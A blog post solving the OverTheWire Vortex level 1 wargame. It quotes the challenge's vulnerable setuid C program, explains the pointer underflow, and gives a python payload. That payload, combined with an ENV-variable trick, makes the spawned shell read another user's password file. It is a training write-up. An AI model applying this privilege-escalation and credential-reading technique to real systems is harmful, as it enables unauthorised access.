+++
title = "OverTheWire: Vortex Level1"
author = "Victor"
date = "2013-05-03"
tags = ["coding", "security", "wargames", "vortex", "appsec"]
category = "blog"
+++

Solution for http://www.overthewire.org/wargames/vortex/vortex1.shtml. Here's the code they have used:

~~~.c
#include 
#include 
#include 
#include

#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }

void print(unsigned char *buf, int len)
{
        int i;

        printf("[ ");
        for(i=0; i < len; i++) printf("%x ", buf[i]); 
        printf(" ]\n");
}

int main()
{
        unsigned char buf[512];
        unsigned char *ptr = buf + (sizeof(buf)/2);
        unsigned int x;

        while((x = getchar()) != EOF) {
                switch(x) {
                        case '\n': print(buf, sizeof(buf)); continue; break;
                        case '\\': ptr--; break; 
                        default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
                }
        }
        printf("All done\n");
}
~~~

The executable was at /**vortex**/vortex1:

~~~.shell
$ ls -l /vortex/vortex1
-r-sr-x--- 1 vortex2 vortex1 7398 2011-11-13 23:07 /vortex/vortex1
~~~

I hope you have noticed the SETUID-Bit which belongs to user vortex2. So that programm will run as vortex2. The password we need to find out is at /etc/vortex_pass/vortex2. Now let’s analyze the code...

* There is a buffer `buf` of size 512 * ptr points at the middle of the buffer
* Everytime "\"" is read in, `ptr` is decremented. So we need to set ptr to the beginning of `buf`'s address
* `e()` is a macro which checks if `*ptr = 0xCA`. If this is true, then an "interactive shell will be launched. This is what I did:

~~~.shell
$ python -c 'print "\\"*257 + "\xca" + "XXX"' | /vortex/vortex1 
$ 
~~~

Nothing happens. We need to execute the new process (/bin/sh) with some "extra arguments". I have created following script:

~~~.shell
$ cat script.sh 
cat /etc/vortex_pass/vortex2
~~~

...then as the bash manual states:

>"When invoked as an interactive shell with the name sh, bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute"

We'll need to set the ENV variable properly and we're done:

~~~.shell
$ python -c 'print "\\"*257 + "\xca" + "XXX"' | env ENV=/tmp/****/script.sh /vortex/vortex1 
******
$ 
~~~

